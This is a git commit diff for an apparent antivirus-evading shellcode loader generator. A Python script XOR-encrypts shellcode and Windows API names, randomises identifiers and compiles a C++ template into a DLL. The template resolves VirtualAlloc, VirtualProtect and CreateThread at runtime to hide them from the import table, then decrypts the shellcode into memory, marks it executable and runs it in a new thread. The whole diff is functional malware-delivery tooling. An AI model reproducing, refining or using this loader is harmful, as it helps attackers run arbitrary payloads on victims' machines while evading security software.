00a45f1c910d80f692ea6950a500c52f92e60f24
fyrworx4 <fyrworx@gmail.com>
2024-08-05 21:36:48 -0400

    added compiler step to kai.py

--- kai.py
+++ kai.py
@@ -13,6 +13,7 @@ def get_random_string():
     # print random string
     return result_str
 
+
 def xor(data):
     
     key = get_random_string()
@@ -27,6 +28,7 @@ def xor(data):
 
     ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
     return ciphertext, key
+
 
 def main():
     parser = argparse.ArgumentParser()
@@ -44,76 +46,116 @@ def main():
     buf, pl_key = xor(shellcode)
     virtual_alloc, va_key = xor("VirtualAlloc")
     virtual_protect, vp_key = xor("VirtualProtect")
+    create_thread, ct_key = xor("CreateThread")
+    sleep_var, s_key = xor("Sleep")
     kernel32, k_key = xor("kernel32.dll")
-
+    
     # Obfuscate variable names
-    execute_name = get_random_string()
-    payloadAddress_name = get_random_string()
+    fnVirtualAlloc_name = get_random_string()
+    fnVirtualProtect_name = get_random_string()
+    fnCreateThread_name = get_random_string()
+    fnSleep_name = get_random_string()
+
     buf_name = get_random_string()
     virtual_alloc_name = get_random_string()
     virtual_protect_name = get_random_string()
+    create_thread_name = get_random_string()
+    sleep_var_name = get_random_string()
     kernel32_name = get_random_string()
+    
     pl_key_name = get_random_string()
     va_key_name = get_random_string()
     vp_key_name = get_random_string()
     k_key_name = get_random_string()
+    ct_key_name = get_random_string()
+    s_key_name = get_random_string()
+
+    execute_name = get_random_string()
+    payloadAddress_name = get_random_string()
     pVirtualAlloc_name = get_random_string()
     pVirtualProtect_name = get_random_string()
+    pCreateThread_name = get_random_string()
+    pSleep_name = get_random_string()
     oldProt_name = get_random_string()
     success_name = get_random_string()
-    sCF_name = get_random_string()
+    hThread_name = get_random_string()
     XOR_name = get_random_string()
     ConvertUnsignedCharArrayToLPCSTR_name = get_random_string()
     bstr_name = get_random_string()
     k32_wide_name = get_random_string()
     va_wide_name = get_random_string()
     vp_wide_name = get_random_string()
+    ct_wide_name = get_random_string()
+    s_wide_name = get_random_string()
 
     # Replace names and stuff
-    template = open("template.cpp", "rt")
-    data = template.read()
-    time.sleep(1)
+    with open("template.cpp", "rt") as template:
+        data = template.read()
 
-    # Replace char arrays with obfucated versions
-    data = data.replace('unsigned char buf[] = { };', 'unsigned char buf[] = ' + buf)
-    data = data.replace('unsigned char virtual_alloc[] = { };', 'unsigned char virtual_alloc[] = ' + virtual_alloc)
-    data = data.replace('unsigned char virtual_protect[] = { };', 'unsigned char virtual_protect[] = ' + virtual_protect)
-    data = data.replace('unsigned char kernel32[] = { };', 'unsigned char kernel32[] = ' + kernel32)
-    
-    # Add decryption keys
-    data = data.replace('char pl_key[] = ""', 'char pl_key[] = "' + pl_key + '";')
-    data = data.replace('char va_key[] = ""', 'char va_key[] = "' + va_key + '";')
-    data = data.replace('char vp_key[] = ""', 'char vp_key[] = "' + vp_key + '";')
-    data = data.replace('char k_key[] = ""', 'char k_key[] = "' + k_key + '";')
-   
-    # Replace variable names
-    data = data.replace('execute', execute_name)
-    data = data.replace('payloadAddress', payloadAddress_name)
-    data = data.replace('buf', buf_name)
-    data = data.replace('virtual_alloc', virtual_alloc_name)
-    data = data.replace('virtual_protect', virtual_protect_name)
-    data = data.replace('kernel32', kernel32_name)
-    data = data.replace('pl_key', pl_key_name)
-    data = data.replace('va_key', va_key_name)
-    data = data.replace('vp_key', vp_key_name)
-    data = data.replace('k_key', k_key_name)
-    data = data.replace('pVirtualAlloc', pVirtualAlloc_name)
-    data = data.replace('pVirtualProtect', pVirtualProtect_name)
-    data = data.replace('oldProt', oldProt_name)
-    data = data.replace('success', success_name)
-    data = data.replace('sCF', sCF_name)
-    data = data.replace('XOR', XOR_name)
-    data = data.replace('ConvertUnsignedCharArrayToLPCSTR', ConvertUnsignedCharArrayToLPCSTR_name)
-    data = data.replace('bstr', bstr_name)
-    data = data.replace('k32_wide', k32_wide_name)
-    data = data.replace('va_wide', va_wide_name)
-    data = data.replace('vp_wide', vp_wide_name)
+        # Replace char arrays with obfucated versions
+        data = data.replace('unsigned char buf[] = { };', 'unsigned char buf[] = ' + buf)
+        data = data.replace('unsigned char virtual_alloc[] = { };', 'unsigned char virtual_alloc[] = ' + virtual_alloc)
+        data = data.replace('unsigned char virtual_protect[] = { };', 'unsigned char virtual_protect[] = ' + virtual_protect)
+        data = data.replace('unsigned char kernel32[] = { };', 'unsigned char kernel32[] = ' + kernel32)
+        data = data.replace('unsigned char create_thread[] = { };', 'unsigned char create_thread[] = ' + create_thread)
+        data = data.replace('unsigned char sleep_var[] = { };', 'unsigned char sleep_var[] = ' + sleep_var)
+        
+        # Add decryption keys
+        data = data.replace('char pl_key[] = ""', 'char pl_key[] = "' + pl_key + '"')
+        data = data.replace('char va_key[] = ""', 'char va_key[] = "' + va_key + '"')
+        data = data.replace('char vp_key[] = ""', 'char vp_key[] = "' + vp_key + '"')
+        data = data.replace('char k_key[] = ""', 'char k_key[] = "' + k_key + '"')
+        data = data.replace('char ct_key[] = ""', 'char ct_key[] = "' + ct_key + '"')
+        data = data.replace('char s_key[] = ""', 'char s_key[] = "' + s_key + '"')
+       
+        # Replace variable names
+        data = data.replace('fnVirtualAlloc', fnVirtualAlloc_name)
+        data = data.replace('fnVirtualProtect', fnVirtualProtect_name)
+        data = data.replace('fnCreateThread', fnCreateThread_name)
+        data = data.replace('fnSleep', fnSleep_name)
 
-    template.close()
-    template = open("temp.cpp", "w+")
-    template.write(data)
-    time.sleep(1)
-    template.close
+        data = data.replace('buf', buf_name)
+        data = data.replace('virtual_alloc', virtual_alloc_name)
+        data = data.replace('virtual_protect', virtual_protect_name)
+        data = data.replace('kernel32', kernel32_name)
+        data = data.replace('create_thread', create_thread_name)
+        data = data.replace('sleep_var', sleep_var_name)
+
+        data = data.replace('pl_key', pl_key_name)
+        data = data.replace('va_key', va_key_name)
+        data = data.replace('vp_key', vp_key_name)
+        data = data.replace('k_key', k_key_name)
+        data = data.replace('ct_key', ct_key_name)
+        data = data.replace('s_key', s_key_name)
+
+        data = data.replace('execute', execute_name)
+        data = data.replace('payloadAddress', payloadAddress_name)
+        data = data.replace('pVirtualAlloc', pVirtualAlloc_name)
+        data = data.replace('pVirtualProtect', pVirtualProtect_name)
+        data = data.replace('pCreateThread', pCreateThread_name)
+        data = data.replace('pSleep', pSleep_name)
+        
+        data = data.replace('oldProt', oldProt_name)
+        data = data.replace('success', success_name)
+        data = data.replace('hThread', hThread_name)
+        data = data.replace('XOR', XOR_name)
+        data = data.replace('ConvertUnsignedCharArrayToLPCSTR', ConvertUnsignedCharArrayToLPCSTR_name)
+        data = data.replace('bstr', bstr_name)
+        data = data.replace('k32_wide', k32_wide_name)
+        data = data.replace('va_wide', va_wide_name)
+        data = data.replace('vp_wide', vp_wide_name)
+        data = data.replace('ct_wide', ct_wide_name)
+        data = data.replace('s_wide', s_wide_name)
+
+    # Write data
+    with open("temp.cpp", "w+") as template:
+        template.write(data)
+
+    # compile
+    try:
+        os.system('x86_64-w64-mingw32-g++ -shared -o kai.dll temp.cpp -Wall')
+    except Exception as e:
+        print(e)
 
 
 if __name__ == "__main__":
--- template.cpp
+++ template.cpp
@@ -1,4 +1,4 @@
-#include <Windows.h>
+#include <windows.h>
 #include <stdio.h>
 #include <winternl.h>
 #include <stdlib.h>
@@ -7,7 +7,7 @@
 typedef LPVOID (WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 typedef BOOL (WINAPI* fnVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 typedef HANDLE (WINAPI* fnCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-typedef DWORD (WINAPI* fnWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+typedef VOID (WINAPI* fnSleep)(DWORD dwMilliseconds);
 
 
 void XOR(char* data, size_t data_len, char* key, size_t key_len) {
@@ -38,63 +38,74 @@ LPCSTR ConvertUnsignedCharArrayToLPCSTR(const unsigned char* src, size_t src_len
 }
 
 
-BOOL execute() {
+extern "C" {
+    BOOL execute() {
 
-    // Encrypted strings
-    unsigned char buf[] = { };
-    unsigned char virtual_alloc[] = { };
-    unsigned char virtual_protect[] = { };
-    unsigned char kernel32[] = { };
-    char pl_key[] = "";
-    char va_key[] = "";
-    char vp_key[] = "";
-    char k_key[] = "";
+        // Encrypted strings
+        unsigned char buf[] = { };
+        unsigned char virtual_alloc[] = { };
+        unsigned char virtual_protect[] = { };
+        unsigned char kernel32[] = { };
+        unsigned char create_thread[] = { };
+        unsigned char sleep_var[] = { };
+        char pl_key[] = "";
+        char va_key[] = "";
+        char vp_key[] = "";
+        char k_key[] = "";
+        char ct_key[] = "";
+        char s_key[] = "";
 
-    // Decrypt strings
-    XOR((char*)virtual_alloc, sizeof(virtual_alloc), va_key, sizeof(va_key));
-    XOR((char*)virtual_protect, sizeof(virtual_protect), vp_key, sizeof(vp_key));
-    XOR((char*)kernel32, sizeof(kernel32), k_key, sizeof(k_key));
+        // Decrypt strings
+        XOR((char*)virtual_alloc, sizeof(virtual_alloc), va_key, sizeof(va_key));
+        XOR((char*)virtual_protect, sizeof(virtual_protect), vp_key, sizeof(vp_key));
+        XOR((char*)kernel32, sizeof(kernel32), k_key, sizeof(k_key));
+        XOR((char*)create_thread, sizeof(create_thread), ct_key, sizeof(ct_key));
+        XOR((char*)sleep_var, sizeof(sleep_var), s_key, sizeof(s_key));
 
-    // Convert strings to LPCWSTR
-    LPCSTR k32_wide = ConvertUnsignedCharArrayToLPCSTR(kernel32, sizeof(kernel32) / sizeof(kernel32[0]));
-    LPCSTR va_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_alloc, sizeof(virtual_alloc) / sizeof(virtual_alloc[0]));
-    LPCSTR vp_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_protect, sizeof(virtual_protect) / sizeof(virtual_protect[0]));
-    
-    // Dynamic linking to prevent some Win32 APIs from being inside IAT
-    fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(GetModuleHandleA(k32_wide), va_wide);
-    fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddress(GetModuleHandleA(k32_wide), vp_wide);
-        
-    // Allocate memory
-    PVOID payloadAddress = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        // Convert strings to LPCSTR
+        LPCSTR k32_wide = ConvertUnsignedCharArrayToLPCSTR(kernel32, sizeof(kernel32) / sizeof(kernel32[0]));
+        LPCSTR va_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_alloc, sizeof(virtual_alloc) / sizeof(virtual_alloc[0]));
+        LPCSTR vp_wide = ConvertUnsignedCharArrayToLPCSTR(virtual_protect, sizeof(virtual_protect) / sizeof(virtual_protect[0]));
+        LPCSTR ct_wide = ConvertUnsignedCharArrayToLPCSTR(create_thread, sizeof(create_thread) / sizeof(create_thread[0]));
+        LPCSTR s_wide = ConvertUnsignedCharArrayToLPCSTR(sleep_var, sizeof(sleep_var) / sizeof(sleep_var[0]));
 
-    if (payloadAddress == NULL) {
-        return 1;
+        // Dynamic linking to prevent some Win32 APIs from being inside IAT
+        fnVirtualAlloc pVirtualAlloc = (fnVirtualAlloc)GetProcAddress(GetModuleHandleA(k32_wide), va_wide);
+        fnVirtualProtect pVirtualProtect = (fnVirtualProtect)GetProcAddress(GetModuleHandleA(k32_wide), vp_wide);
+        fnCreateThread pCreateThread = (fnCreateThread)GetProcAddress(GetModuleHandleA(k32_wide), ct_wide);
+        fnSleep pSleep = (fnSleep)GetProcAddress(GetModuleHandleA(k32_wide), s_wide);
+
+        // Allocate memory
+        PVOID payloadAddress = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+        if (payloadAddress == NULL) {
+            return 1;
+        }
+
+        // Decrypt payload
+        XOR((char*)buf, sizeof(buf), pl_key, sizeof(pl_key));
+
+        // Copy payload
+        memcpy(payloadAddress, buf, sizeof(buf));
+
+        // Change protection
+        DWORD oldProt = 0;
+        BOOL success = pVirtualProtect(payloadAddress, sizeof(buf), PAGE_EXECUTE_READ, &oldProt);
+
+        if (!success) {
+            return 1;
+        }
+
+        // Execute payload
+        HANDLE hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)payloadAddress, 0, 0, 0);
+        if (hThread == NULL) {
+            return 1;
+        }
+
+        pSleep(1000);
+
+        return 0;
     }
-
-    // Decrypt payload
-    XOR((char*)buf, sizeof(buf), pl_key, sizeof(pl_key));
-
-    // Copy payload
-    memcpy(payloadAddress, buf, sizeof(buf));
-
-    // Change protection
-    DWORD oldProt = 0;
-    BOOL success = pVirtualProtect(payloadAddress, sizeof(buf), PAGE_EXECUTE_READ, &oldProt);
-
-    if (!success) {
-        return 1;
-    }
-
-    // Execute payload
-    CHOOSEFONT sCF = { 0 };
-    sCF.lStructSize = sizeof(sCF);
-    sCF.Flags = CF_ENABLEHOOK;
-    sCF.lpfnHook = (LPCFHOOKPROC)payloadAddress;
-
-    ChooseFont(&sCF);
-
-    Sleep(1000);
-
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
